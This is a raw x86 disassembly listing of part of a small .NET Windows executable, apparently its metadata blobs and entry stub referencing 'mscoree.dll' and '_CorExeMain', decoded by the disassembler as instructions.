  409c7d:	2d 06 20 02 01       	sub    $0x1022006,%eax
  409c82:	1c 12                	sbb    $0x12,%al
  409c84:	69 07 20 02 01 10    	imul   $0x10010220,(%edi),%eax
  409c8a:	11 34 08             	adc    %esi,(%eax,%ecx,1)
  409c8d:	05 20 01 01 12       	add    $0x12010120,%eax
  409c92:	6d                   	insl   (%dx),%es:(%edi)
  409c93:	03 06                	add    (%esi),%eax
  409c95:	12 71 03             	adc    0x3(%ecx),%dh
  409c98:	06                   	push   %es
  409c99:	12 75 05             	adc    0x5(%ebp),%dh
  409c9c:	00 01                	add    %al,(%ecx)
  409c9e:	19 11                	sbb    %edx,(%ecx)
  409ca0:	40                   	inc    %eax
  409ca1:	05 00 01 11 3c       	add    $0x3c110100,%eax
  409ca6:	19 03                	sbb    %eax,(%ebx)
  409ca8:	00 00                	add    %al,(%eax)
  409caa:	02 02                	add    (%edx),%al
  409cac:	06                   	push   %es
  409cad:	09 03                	or     %eax,(%ebx)
  409caf:	06                   	push   %es
  409cb0:	11 3c 04             	adc    %edi,(%esp,%eax,1)
  409cb3:	03 00                	add    (%eax),%eax
  409cb5:	00 00                	add    %al,(%eax)
  409cb7:	04 00                	add    $0x0,%al
  409cb9:	80 00 00             	addb   $0x0,(%eax)
  409cbc:	03 06                	add    (%esi),%eax
  409cbe:	11 40 04             	adc    %eax,0x4(%eax)
  409cc1:	f6 ff                	idiv   %bh
  409cc3:	ff                   	(bad)
  409cc4:	ff 04 f5 ff ff ff 04 	incl   0x4ffffff(,%esi,8)
  409ccb:	f4                   	hlt
  409ccc:	ff                   	(bad)
  409ccd:	ff                   	(bad)
  409cce:	ff 03                	incl   (%ebx)
  409cd0:	06                   	push   %es
  409cd1:	12 1c 12             	adc    (%edx,%edx,1),%bl
  409cd4:	20 03                	and    %al,(%ebx)
  409cd6:	15 12 79 02 0e       	adc    $0xe027912,%eax
  409cdb:	12 7d 0e             	adc    0xe(%ebp),%bh
  409cde:	0e                   	push   %cs
  409cdf:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409ce4:	80 81 0c 20 04 08 0e 	addb   $0xe,0x804200c(%ecx)
  409ceb:	0e                   	push   %cs
  409cec:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  409cf1:	51                   	push   %ecx
  409cf2:	08 0d 20 06 12 80    	or     %cl,0x80120620
  409cf8:	85 0e                	test   %ecx,(%esi)
  409cfa:	0e                   	push   %cs
  409cfb:	0e                   	push   %cs
  409cfc:	0e                   	push   %cs
  409cfd:	11 25 11 29 09 20    	adc    %esp,0x20092911
  409d03:	04 12                	add    $0x12,%al
  409d05:	80 85 0e 0e 0e 0e 04 	addb   $0x4,0xe0e0e0e(%ebp)
  409d0c:	20 00                	and    %al,(%eax)
  409d0e:	12 11                	adc    (%ecx),%dl
  409d10:	05 20 00 12 80       	add    $0x80120020,%eax
  409d15:	89 08                	mov    %ecx,(%eax)
  409d17:	20 03                	and    %al,(%ebx)
  409d19:	01 11                	add    %edx,(%ecx)
  409d1b:	2d 11 2d 0e 03       	sub    $0x30e2d11,%eax
  409d20:	06                   	push   %es
  409d21:	12 30                	adc    (%eax),%dh
  409d23:	06                   	push   %es
  409d24:	20 02                	and    %al,(%edx)
  409d26:	01 0a                	add    %ecx,(%edx)
  409d28:	12 6d 04             	adc    0x4(%ebp),%ch
  409d2b:	28 00                	sub    %al,(%eax)
  409d2d:	12 11                	adc    (%ecx),%dl
  409d2f:	03 06                	add    (%esi),%eax
  409d31:	12 50 03             	adc    0x3(%eax),%dl
  409d34:	06                   	push   %es
  409d35:	12 44 04 06          	adc    0x6(%esp,%eax,1),%al
  409d39:	12 80 8d 04 06 11    	adc    0x1106048d(%eax),%al
  409d3f:	80 91 07 20 02 01 12 	adcb   $0x12,0x1022007(%ecx)
  409d46:	50                   	push   %eax
  409d47:	12 44 04 20          	adc    0x20(%esp,%eax,1),%al
  409d4b:	00 12                	add    %dl,(%edx)
  409d4d:	7d 03                	jge    0x409d52
  409d4f:	06                   	push   %es
  409d50:	12 7d 05             	adc    0x5(%ebp),%bh
  409d53:	20 00                	and    %al,(%eax)
  409d55:	12 80 8d 05 20 00    	adc    0x20058d(%eax),%al
  409d5b:	11 80 91 04 20 00    	adc    %eax,0x200491(%eax)
  409d61:	12 19                	adc    (%ecx),%bl
  409d63:	05 20 00 12 80       	add    $0x80120020,%eax
  409d68:	95                   	xchg   %eax,%ebp
  409d69:	04 28                	add    $0x28,%al
  409d6b:	00 12                	add    %dl,(%edx)
  409d6d:	7d 05                	jge    0x409d74
  409d6f:	28 00                	sub    %al,(%eax)
  409d71:	12 80 8d 05 28 00    	adc    0x28058d(%eax),%al
  409d77:	11 80 91 04 28 00    	adc    %eax,0x280491(%eax)
  409d7d:	12 19                	adc    (%ecx),%bl
  409d7f:	05 28 00 12 80       	add    $0x80120028,%eax
  409d84:	95                   	xchg   %eax,%ebp
  409d85:	05 20 01 01 12       	add    $0x12010120,%eax
  409d8a:	44                   	inc    %esp
  409d8b:	04 20                	add    $0x20,%al
  409d8d:	01 01                	add    %eax,(%ecx)
  409d8f:	02 05 00 01 08 1d    	add    0x1d080100,%al
  409d95:	0e                   	push   %cs
  409d96:	07                   	pop    %es
  409d97:	00 02                	add    %al,(%edx)
  409d99:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  409d9c:	80 99 06 20 01 01 11 	sbbb   $0x11,0x1012006(%ecx)
  409da3:	80 a1 01 02 01 15 05 	andb   $0x5,0x15010201(%ecx)
  409daa:	20 02                	and    %al,(%edx)
  409dac:	01 0e                	add    %ecx,(%esi)
  409dae:	08 04 00             	or     %al,(%eax,%eax,1)
  409db1:	01 02                	add    %eax,(%edx)
  409db3:	0e                   	push   %cs
  409db4:	06                   	push   %es
  409db5:	10 01                	adc    %al,(%ecx)
  409db7:	01 08                	add    %ecx,(%eax)
  409db9:	1e                   	push   %ds
  409dba:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409dbd:	01 11                	add    %edx,(%ecx)
  409dbf:	0c 0f                	or     $0xf,%al
  409dc1:	07                   	pop    %es
  409dc2:	07                   	pop    %es
  409dc3:	12 21                	adc    (%ecx),%ah
  409dc5:	12 21                	adc    (%ecx),%ah
  409dc7:	11 0c 02             	adc    %ecx,(%edx,%eax,1)
  409dca:	11 10                	adc    %edx,(%eax)
  409dcc:	11 14 12             	adc    %edx,(%edx,%edx,1)
  409dcf:	18 06                	sbb    %al,(%esi)
  409dd1:	20 01                	and    %al,(%ecx)
  409dd3:	01 11                	add    %edx,(%ecx)
  409dd5:	80 dd 05             	sbb    $0x5,%ch
  409dd8:	20 02                	and    %al,(%edx)
  409dda:	01 08                	add    %ecx,(%eax)
  409ddc:	08 04 20             	or     %al,(%eax,%eiz,1)
  409ddf:	01 01                	add    %eax,(%ecx)
  409de1:	0d 08 14 11 39       	or     $0x39111408,%eax
  409de6:	02 00                	add    (%eax),%al
  409de8:	02 00                	add    (%eax),%al
  409dea:	00 07                	add    %al,(%edi)
  409dec:	20 02                	and    %al,(%edx)
  409dee:	10 11                	adc    %dl,(%ecx)
  409df0:	39 08                	cmp    %ecx,(%eax)
  409df2:	08 0b                	or     %cl,(%ebx)
  409df4:	20 04 01             	and    %al,(%ecx,%eax,1)
  409df7:	03 11                	add    (%ecx),%edx
  409df9:	2d 11 2d 11 80       	sub    $0x80112d11,%eax
  409dfe:	e9 0c 07 03 14       	jmp    0x1443a50f
  409e03:	11 39                	adc    %edi,(%ecx)
  409e05:	02 00                	add    (%eax),%al
  409e07:	02 00                	add    (%eax),%al
  409e09:	00 08                	add    %cl,(%eax)
  409e0b:	08 04 07             	or     %al,(%edi,%eax,1)
  409e0e:	01 11                	add    %edx,(%ecx)
  409e10:	35 04 07 01 11       	xor    $0x11010704,%eax
  409e15:	31 05 00 00 12 80    	xor    %eax,0x80120000
  409e1b:	ed                   	in     (%dx),%eax
  409e1c:	05 20 02 01 0c       	add    $0xc010220,%eax
  409e21:	0c 06                	or     $0x6,%al
  409e23:	20 01                	and    %al,(%ecx)
  409e25:	01 11                	add    %edx,(%ecx)
  409e27:	80 f1 06             	xor    $0x6,%cl
  409e2a:	20 01                	and    %al,(%ecx)
  409e2c:	01 11                	add    %edx,(%ecx)
  409e2e:	80 f9 06             	cmp    $0x6,%cl
  409e31:	20 01                	and    %al,(%ecx)
  409e33:	01 11                	add    %edx,(%ecx)
  409e35:	81 05 08 00 01 12 81 	addl   $0x80120981,0x12010008
  409e3c:	09 12 80 
  409e3f:	e5 05                	in     $0x5,%eax
  409e41:	20 00                	and    %al,(%eax)
  409e43:	11 81 0d 06 20 01    	adc    %eax,0x120060d(%ecx)
  409e49:	01 11                	add    %edx,(%ecx)
  409e4b:	81 11 05 20 00 12    	adcl   $0x12002005,(%ecx)
  409e51:	81 15 06 20 01 01 12 	adcl   $0x7e58012,0x1012006
  409e58:	80 e5 07 
  409e5b:	20 04 01             	and    %al,(%ecx,%eax,1)
  409e5e:	08 08                	or     %cl,(%eax)
  409e60:	08 08                	or     %cl,(%eax)
  409e62:	04 00                	add    $0x0,%al
  409e64:	01 0e                	add    %ecx,(%esi)
  409e66:	18 05 20 01 01 11    	sbb    %al,0x11010120
  409e6c:	49                   	dec    %ecx
  409e6d:	05 00 02 08 08       	add    $0x8080200,%eax
  409e72:	08 07                	or     %al,(%edi)
  409e74:	20 01                	and    %al,(%ecx)
  409e76:	01 1d 12 80 e5 06    	add    %ebx,0x6e58012
  409e7c:	20 01                	and    %al,(%ecx)
  409e7e:	01 11                	add    %edx,(%ecx)
  409e80:	81 1d 06 20 01 01 11 	sbbl   $0x5218111,0x1012006
  409e87:	81 21 05 
  409e8a:	00 00                	add    %al,(%eax)
  409e8c:	12 81 25 06 00 01    	adc    0x1000625(%ecx),%al
  409e92:	12 81 29 0e 06 20    	adc    0x20060e29(%ecx),%al
  409e98:	01 01                	add    %eax,(%ecx)
  409e9a:	12 81 29 06 20 01    	adc    0x1200629(%ecx),%al
  409ea0:	01 12                	add    %edx,(%edx)
  409ea2:	81 2d 04 20 00 11 49 	subl   $0xa071a49,0x11002004
  409ea9:	1a 07 0a 
  409eac:	12 15 12 71 12 80    	adc    0x80127112,%dl
  409eb2:	fd                   	std
  409eb3:	12 81 01 12 81 01    	adc    0x1811201(%ecx),%al
  409eb9:	0e                   	push   %cs
  409eba:	0e                   	push   %cs
  409ebb:	11 49 11             	adc    %ecx,0x11(%ecx)
  409ebe:	81 0d 1d 12 80 e5 06 	orl    $0x4d121506,0xe580121d
  409ec5:	15 12 4d 
  409ec8:	01 12                	add    %edx,(%edx)
  409eca:	51                   	push   %ecx
  409ecb:	09 20                	or     %esp,(%eax)
  409ecd:	00 15 12 81 39 01    	add    %dl,0x1398112
  409ed3:	13 00                	adc    (%eax),%eax
  409ed5:	07                   	pop    %es
  409ed6:	15 12 81 39 01       	adc    $0x1398112,%eax
  409edb:	12 51 04             	adc    0x4(%ecx),%dl
  409ede:	20 00                	and    %al,(%eax)
  409ee0:	13 00                	adc    (%eax),%eax
  409ee2:	07                   	pop    %es
  409ee3:	20 02                	and    %al,(%edx)
  409ee5:	01 12                	add    %edx,(%edx)
  409ee7:	80 e5 0e             	and    $0xe,%ch
  409eea:	25 07 0f 12 15       	and    $0x15120f07,%eax
  409eef:	1d 12 81 31 12       	sbb    $0x12318112,%eax
  409ef4:	81 35 12 81 01 08 08 	xorl   $0x8711208,0x8018112
  409efb:	12 71 08 
  409efe:	08 12                	or     %dl,(%edx)
  409f00:	51                   	push   %ecx
  409f01:	08 08                	or     %cl,(%eax)
  409f03:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409f09:	15 12 81 39 01       	adc    $0x1398112,%eax
  409f0e:	12 51 06             	adc    0x6(%ecx),%dl
  409f11:	07                   	pop    %es
  409f12:	02 12                	add    (%edx),%dl
  409f14:	21 1d 05 09 07 03    	and    %ebx,0x3070905
  409f1a:	12 2c 12             	adc    (%edx,%edx,1),%ch
  409f1d:	71 11                	jno    0x409f30
  409f1f:	81 0d 05 20 02 01 1c 	orl    $0x2006181c,0x1022005
  409f26:	18 06 20 
  409f29:	01 01                	add    %eax,(%ecx)
  409f2b:	12 81 49 04 20 00    	adc    0x200449(%ecx),%al
  409f31:	11 55 04             	adc    %edx,0x4(%ebp)
  409f34:	20 01                	and    %al,(%ecx)
  409f36:	03 08                	add    (%eax),%ecx
  409f38:	04 20                	add    $0x20,%al
  409f3a:	01 01                	add    %eax,(%ecx)
  409f3c:	03 06                	add    (%esi),%eax
  409f3e:	20 01                	and    %al,(%ecx)
  409f40:	01 11                	add    %edx,(%ecx)
  409f42:	81 4d 05 20 00 11 81 	orl    $0x81110020,0x5(%ebp)
  409f49:	4d                   	dec    %ebp
  409f4a:	04 00                	add    $0x0,%al
  409f4c:	00 11                	add    %dl,(%ecx)
  409f4e:	65 05 00 01 11 65    	gs add $0x65110100,%eax
  409f54:	0e                   	push   %cs
  409f55:	04 07                	add    $0x7,%al
  409f57:	01 11                	add    %edx,(%ecx)
  409f59:	2d 05 20 01 01       	sub    $0x1012005,%eax
  409f5e:	11 65 06             	adc    %esp,0x6(%ebp)
  409f61:	20 01                	and    %al,(%ecx)
  409f63:	01 12                	add    %edx,(%edx)
  409f65:	81 59 06 15 12 61 01 	sbbl   $0x1611215,0x6(%ecx)
  409f6c:	11 34 05 20 01 13 00 	adc    %esi,0x130120(,%eax,1)
  409f73:	08 05 20 00 12 81    	or     %al,0x81120020
  409f79:	5d                   	pop    %ebp
  409f7a:	09 20                	or     %esp,(%eax)
  409f7c:	02 01                	add    (%ecx),%al
  409f7e:	12 81 5d 11 81 61    	adc    0x6181115d(%ecx),%al
  409f84:	06                   	push   %es
  409f85:	20 01                	and    %al,(%ecx)
  409f87:	01 12                	add    %edx,(%edx)
  409f89:	81 5d 06 20 01 01 11 	sbbl   $0x11010120,0x6(%ebp)
  409f90:	81 65 05 20 00 11 81 	andl   $0x81110020,0x5(%ebp)
  409f97:	69 05 20 01 01 13 00 	imul   $0x2200600,0x13010120,%eax
  409f9e:	06 20 02 
  409fa1:	01 08                	add    %ecx,(%eax)
  409fa3:	13 00                	adc    (%eax),%eax
  409fa5:	06                   	push   %es
  409fa6:	20 03                	and    %al,(%ebx)
  409fa8:	01 08                	add    %ecx,(%eax)
  409faa:	08 08                	or     %cl,(%eax)
  409fac:	03 20                	add    (%eax),%esp
  409fae:	00 0d 07 00 04 0e    	add    %cl,0xe040007
  409fb4:	0e                   	push   %cs
  409fb5:	1c 1c                	sbb    $0x1c,%al
  409fb7:	1c 05                	sbb    $0x5,%al
  409fb9:	00 02                	add    %al,(%edx)
  409fbb:	0e                   	push   %cs
  409fbc:	0e                   	push   %cs
  409fbd:	0e                   	push   %cs
  409fbe:	03 00                	add    (%eax),%eax
  409fc0:	00 01                	add    %al,(%ecx)
  409fc2:	2d 07 14 08 08       	sub    $0x8081407,%eax
  409fc7:	08 11                	or     %dl,(%ecx)
  409fc9:	34 08                	xor    $0x8,%al
  409fcb:	08 08                	or     %cl,(%eax)
  409fcd:	08 08                	or     %cl,(%eax)
  409fcf:	11 81 71 11 81 0d    	adc    %eax,0xd811171(%ecx)
  409fd5:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409fdb:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409fe1:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409fe7:	11 81 0d 11 81 0d    	adc    %eax,0xd81110d(%ecx)
  409fed:	11 81 0d 05 07 02    	adc    %eax,0x207050d(%ecx)
  409ff3:	19 11                	sbb    %edx,(%ecx)
  409ff5:	3c 06                	cmp    $0x6,%al
  409ff7:	00 02                	add    %al,(%edx)
  409ff9:	11 49 0e             	adc    %ecx,0xe(%ecx)
  409ffc:	0e                   	push   %cs
  409ffd:	07                   	pop    %es
  409ffe:	15 12 79 02 0e       	adc    $0xe027912,%eax
  40a003:	12 7d 07             	adc    0x7(%ebp),%bh
  40a006:	15 12 4d 01 12       	adc    $0x12014d12,%eax
  40a00b:	80 81 08 15 12 81 39 	addb   $0x39,-0x7eedeaf8(%ecx)
  40a012:	01 12                	add    %edx,(%edx)
  40a014:	80 81 08 00 01 12 81 	addb   $0x81,0x12010008(%ecx)
  40a01b:	81 11 81 85 06 00    	adcl   $0x68581,(%ecx)
  40a021:	01 12                	add    %edx,(%edx)
  40a023:	81 81 0e 05 20 00 12 	addl   $0x6818112,0x20050e(%ecx)
  40a02a:	81 81 06 
  40a02d:	00 03                	add    %al,(%ebx)
  40a02f:	0e                   	push   %cs
  40a030:	0e                   	push   %cs
  40a031:	0e                   	push   %cs
  40a032:	0e                   	push   %cs
  40a033:	09 20                	or     %esp,(%eax)
  40a035:	01 12                	add    %edx,(%edx)
  40a037:	81 81 1d 12 81 81 05 	addl   $0x121d0605,-0x7e7eede3(%ecx)
  40a03e:	06 1d 12 
  40a041:	81 81 13 20 04 12 81 	addl   $0x81118d81,0x12042013(%ecx)
  40a048:	8d 11 81 
  40a04b:	91                   	xchg   %eax,%ecx
  40a04c:	12 81 95 1d 12 81    	adc    -0x7eede26b(%ecx),%al
  40a052:	81 1d 11 81 99 05 20 	sbbl   $0x1d1c0120,0x5998111
  40a059:	01 1c 1d 
  40a05c:	1c 06                	sbb    $0x6,%al
  40a05e:	00 03                	add    %al,(%ebx)
  40a060:	0e                   	push   %cs
  40a061:	0e                   	push   %cs
  40a062:	1c 1c                	sbb    $0x1c,%al
  40a064:	07                   	pop    %es
  40a065:	00 02                	add    %al,(%edx)
  40a067:	1c 1c                	sbb    $0x1c,%al
  40a069:	12 81 81 0d 20 05    	adc    0x5200d81(%ecx),%al
  40a06f:	1c 0e                	sbb    $0xe,%al
  40a071:	11 81 91 12 81 95    	adc    %eax,-0x6a7eed6f(%ecx)
  40a077:	1c 1d                	sbb    $0x1d,%al
  40a079:	1c 04                	sbb    $0x4,%al
  40a07b:	20 01                	and    %al,(%ecx)
  40a07d:	01 1c 07             	add    %ebx,(%edi,%eax,1)
  40a080:	20 02                	and    %al,(%edx)
  40a082:	01 13                	add    %edx,(%ebx)
  40a084:	00 13                	add    %dl,(%ebx)
  40a086:	01 09                	add    %ecx,(%ecx)
  40a088:	00 02                	add    %al,(%edx)
  40a08a:	02 12                	add    (%edx),%dl
  40a08c:	81 81 12 81 81 05 00 	addl   $0xe0e0200,0x5818112(%ecx)
  40a093:	02 0e 0e 
  40a096:	1c 05                	sbb    $0x5,%al
  40a098:	00 02                	add    %al,(%edx)
  40a09a:	02 0e                	add    (%esi),%cl
  40a09c:	0e                   	push   %cs
  40a09d:	3e 07                	ds pop %es
  40a09f:	17                   	pop    %ss
  40a0a0:	0e                   	push   %cs
  40a0a1:	0e                   	push   %cs
  40a0a2:	15 12 79 02 0e       	adc    $0xe027912,%eax
  40a0a7:	12 7d 12             	adc    0x12(%ebp),%bh
  40a0aa:	80 81 12 81 81 12 81 	addb   $0x81,0x12818112(%ecx)
  40a0b1:	81 12 81 81 12 81    	adcl   $0x81128181,(%edx)
  40a0b7:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  40a0ba:	0e                   	push   %cs
  40a0bb:	1c 12                	sbb    $0x12,%al
  40a0bd:	81 a5 12 81 a1 1c 0e 	andl   $0x8580120e,0x1ca18112(%ebp)
  40a0c4:	12 80 85 
  40a0c7:	12 80 89 12 81 a5    	adc    -0x5a7eed77(%eax),%al
  40a0cd:	15 12 81 39 01       	adc    $0x1398112,%eax
  40a0d2:	12 80 81 03 1d 12    	adc    0x121d0381(%eax),%al
  40a0d8:	81 81 1d 1c 03 07 01 	addl   $0x20040801,0x7031c1d(%ecx)
  40a0df:	08 04 20 
  40a0e2:	00 1d 03 07 20 02    	add    %bl,0x2200703
  40a0e8:	01 0e                	add    %ecx,(%esi)
  40a0ea:	12 80 89 0b 07 05    	adc    0x5070b89(%eax),%al
  40a0f0:	12 18                	adc    (%eax),%bl
  40a0f2:	12 80 89 03 1d 03    	adc    0x31d0389(%eax),%al
  40a0f8:	08 03                	or     %al,(%ebx)
  40a0fa:	07                   	pop    %es
  40a0fb:	01 0e                	add    %ecx,(%esi)
  40a0fd:	06                   	push   %es
  40a0fe:	00 01                	add    %al,(%ecx)
  40a100:	11 81 ad 02 05 20    	adc    %eax,0x200502ad(%ecx)
  40a106:	00 11                	add    %dl,(%ecx)
  40a108:	81 b1 04 00 01 01 0e 	xorl   $0x20030e,0x1010004(%ecx)
  40a10f:	03 20 00 
  40a112:	03 08                	add    (%eax),%ecx
  40a114:	07                   	pop    %es
  40a115:	02 12                	add    (%edx),%dl
  40a117:	80 89 11 81 ad 09 07 	orb    $0x7,0x9ad8111(%ecx)
  40a11e:	05 12 80 89 0e       	add    $0xe898012,%eax
  40a123:	03 0e                	add    (%esi),%ecx
  40a125:	08 05 00 00 12 81    	or     %al,0x81120000
  40a12b:	b5 05                	mov    $0x5,%ch
  40a12d:	00 00                	add    %al,(%eax)
  40a12f:	11 80 91 05 00 01    	adc    %eax,0x1000591(%eax)
  40a135:	12 7d 1c             	adc    0x1c(%ebp),%bh
  40a138:	04 07                	add    $0x7,%al
  40a13a:	01 12                	add    %edx,(%edx)
  40a13c:	7d 04                	jge    0x40a142
  40a13e:	06                   	push   %es
  40a13f:	12 81 c1 07 20 02    	adc    0x22007c1(%ecx),%al
  40a145:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40a148:	81 c5 06 20 01 01    	add    $0x1012006,%ebp
  40a14e:	12 81 c9 08 15 12    	adc    0x121508c9(%ecx),%al
  40a154:	81 cd 01 12 81 d1    	or     $0xd1811201,%ebp
  40a15a:	05 20 00 12 81       	add    $0x81120020,%eax
  40a15f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a160:	07                   	pop    %es
  40a161:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  40a166:	12 7d 06             	adc    0x6(%ebp),%bh
  40a169:	20 01                	and    %al,(%ecx)
  40a16b:	01 12                	add    %edx,(%edx)
  40a16d:	81 d9 07 00 01 12    	sbb    $0x12010007,%ecx
  40a173:	81 e1 12 1d 06 20    	and    $0x20061d12,%ecx
  40a179:	01 01                	add    %eax,(%ecx)
  40a17b:	11 81 e5 05 00 00    	adc    %eax,0x5e5(%ecx)
  40a181:	12 81 e9 06 20 01    	adc    0x12006e9(%ecx),%al
  40a187:	01 12                	add    %edx,(%edx)
  40a189:	81 e1 05 20 00 12    	and    $0x12002005,%ecx
  40a18f:	81 ed 0a 20 00 15    	sub    $0x1500200a,%ebp
  40a195:	12 81 cd 01 12 81    	adc    -0x7eedfe33(%ecx),%al
  40a19b:	d1 08                	rorl   $1,(%eax)
  40a19d:	15 12 81 f1 01       	adc    $0x1f18112,%eax
  40a1a2:	12 81 c5 0b 20 01    	adc    0x1200bc5(%ecx),%al
  40a1a8:	01 15 12 81 f1 01    	add    %edx,0x1f18112
  40a1ae:	12 81 c5 06 15 12    	adc    0x121506c5(%ecx),%al
  40a1b4:	81 cd 01 0e 03 00    	or     $0x30e01,%ebp
  40a1ba:	00 0e                	add    %cl,(%esi)
  40a1bc:	06                   	push   %es
  40a1bd:	00 03                	add    %al,(%ebx)
  40a1bf:	08 0e                	or     %cl,(%esi)
  40a1c1:	0e                   	push   %cs
  40a1c2:	02 07                	add    (%edi),%al
  40a1c4:	20 02                	and    %al,(%edx)
  40a1c6:	02 0e                	add    (%esi),%cl
  40a1c8:	11 81 f5 0a 20 03    	adc    %eax,0x3200af5(%ecx)
  40a1ce:	1d 0e 1d 0e 08       	sbb    $0x80e1d0e,%eax
  40a1d3:	11 81 f9 0c 00 04    	adc    %eax,0x4000cf9(%ecx)
  40a1d9:	11 49 0e             	adc    %ecx,0xe(%ecx)
  40a1dc:	0e                   	push   %cs
  40a1dd:	11 81 fd 11 82 01    	adc    %eax,0x18211fd(%ecx)
  40a1e3:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  40a1e8:	03 06                	add    (%esi),%eax
  40a1ea:	20 01                	and    %al,(%ecx)
  40a1ec:	12 82 09 0e 05 00    	adc    0x50e09(%edx),%al
  40a1f2:	00 12                	add    %dl,(%edx)
  40a1f4:	82 0d 09 20 02 01 12 	orb    $0x12,0x1022009
  40a1fb:	82 09 12             	orb    $0x12,(%ecx)
  40a1fe:	82 0d 05 00 02 01 0e 	orb    $0xe,0x1020005
  40a205:	0e                   	push   %cs
  40a206:	06                   	push   %es
  40a207:	20 01                	and    %al,(%ecx)
  40a209:	12 81 e9 0e 06 20    	adc    0x20060ee9(%ecx),%al
  40a20f:	01 12                	add    %edx,(%edx)
  40a211:	82 21 0e             	andb   $0xe,(%ecx)
  40a214:	05 20 00 12 82       	add    $0x82120020,%eax
  40a219:	29 06                	sub    %eax,(%esi)
  40a21b:	00 02                	add    %al,(%edx)
  40a21d:	02 0e                	add    (%esi),%cl
  40a21f:	10 0d 06 20 01 12    	adc    %cl,0x12012006
  40a225:	82 25 08 07 20 02 12 	andb   $0x12,0x2200708
  40a22c:	81 e9 0e 1c 06 20    	sub    $0x20061c0e,%ecx
  40a232:	01 12                	add    %edx,(%edx)
  40a234:	81 e9 1c 1b 30 02    	sub    $0x2301b1c,%ecx
  40a23a:	05 12 81 c9 15       	add    $0x15c98112,%eax
  40a23f:	12 81 cd 01 1e 00    	adc    0x1e01cd(%ecx),%al
  40a245:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  40a24a:	1e                   	push   %ds
  40a24b:	01 12                	add    %edx,(%edx)
  40a24d:	82 3d 12 82 39 1c 05 	cmpb   $0x5,0x1c398212
  40a254:	0a 02                	or     (%edx),%al
  40a256:	0e                   	push   %cs
  40a257:	12 7d 04             	adc    0x4(%ebp),%bh
  40a25a:	20 01                	and    %al,(%ecx)
  40a25c:	02 08                	add    (%eax),%cl
  40a25e:	05 20 00 12 82       	add    $0x82120020,%eax
  40a263:	45                   	inc    %ebp
  40a264:	05 20 00 11 82       	add    $0x82110020,%eax
  40a269:	49                   	dec    %ecx
  40a26a:	51                   	push   %ecx
  40a26b:	07                   	pop    %es
  40a26c:	1f                   	pop    %ds
  40a26d:	12 54 02 0e          	adc    0xe(%edx,%eax,1),%dl
  40a271:	12 48 12             	adc    0x12(%eax),%cl
  40a274:	81 e1 12 81 e9 15    	and    $0x15e98112,%ecx
  40a27a:	12 81 cd 01 0e 0e    	adc    0xe0e01cd(%ecx),%al
  40a280:	15 12 81 cd 01       	adc    $0x1cd8112,%eax
  40a285:	12 7d 08             	adc    0x8(%ebp),%bh
  40a288:	08 0e                	or     %cl,(%esi)
  40a28a:	1d 0e 12 81 25       	sbb    $0x2581120e,%eax
  40a28f:	12 82 09 12 82 11    	adc    0x11821209(%edx),%al
  40a295:	0e                   	push   %cs
  40a296:	0e                   	push   %cs
  40a297:	12 82 1d 08 12 82    	adc    -0x7dedf7e3(%edx),%al
  40a29d:	21 0d 15 12 81 f1    	and    %ecx,0xf1811215
  40a2a3:	01 12                	add    %edx,(%edx)
  40a2a5:	81 c5 15 12 81 f1    	add    $0xf1811215,%ebp
  40a2ab:	01 12                	add    %edx,(%edx)
  40a2ad:	81 c5 12 82 39 12    	add    $0x12398212,%ebp
  40a2b3:	58                   	pop    %eax
  40a2b4:	08 1d 0e 08 1d 0e    	or     %bl,0xe1d080e
  40a2ba:	1d 03 05 01 00       	sbb    $0x10503,%eax
  40a2bf:	00 00                	add    %al,(%eax)
  40a2c1:	00 08                	add    %cl,(%eax)
  40a2c3:	01 00                	add    %eax,(%eax)
  40a2c5:	08 00                	or     %al,(%eax)
  40a2c7:	00 00                	add    %al,(%eax)
  40a2c9:	00 00                	add    %al,(%eax)
  40a2cb:	1e                   	push   %ds
  40a2cc:	01 00                	add    %eax,(%eax)
  40a2ce:	01 00                	add    %eax,(%eax)
  40a2d0:	54                   	push   %esp
  40a2d1:	02 16                	add    (%esi),%dl
  40a2d3:	57                   	push   %edi
  40a2d4:	72 61                	jb     0x40a337
  40a2d6:	70 4e                	jo     0x40a326
  40a2d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2da:	45                   	inc    %ebp
  40a2db:	78 63                	js     0x40a340
  40a2dd:	65 70 74             	gs jo  0x40a354
  40a2e0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40a2e7:	77 73                	ja     0x40a35c
  40a2e9:	01 00                	add    %eax,(%eax)
  40a2eb:	00 14 a3             	add    %dl,(%ebx,%eiz,4)
	...
  40a2f6:	00 00                	add    %al,(%eax)
  40a2f8:	2e a3 00 00 00 20    	mov    %eax,%cs:0x20000000
	...
  40a312:	00 00                	add    %al,(%eax)
  40a314:	20 a3 00 00 00 00    	and    %ah,0x0(%ebx)
	...
  40a322:	5f                   	pop    %edi
  40a323:	43                   	inc    %ebx
  40a324:	6f                   	outsl  %ds:(%esi),(%dx)
  40a325:	72 45                	jb     0x40a36c
  40a327:	78 65                	js     0x40a38e
  40a329:	4d                   	dec    %ebp
  40a32a:	61                   	popa
  40a32b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40a332:	72 65                	jb     0x40a399
  40a334:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40a338:	6c                   	insb   (%dx),%es:(%edi)
  40a339:	00 00                	add    %al,(%eax)
  40a33b:	00 00                	add    %al,(%eax)
  40a33d:	00 ff                	add    %bh,%bh
  40a33f:	25 00 20 40 00       	and    $0x402000,%eax
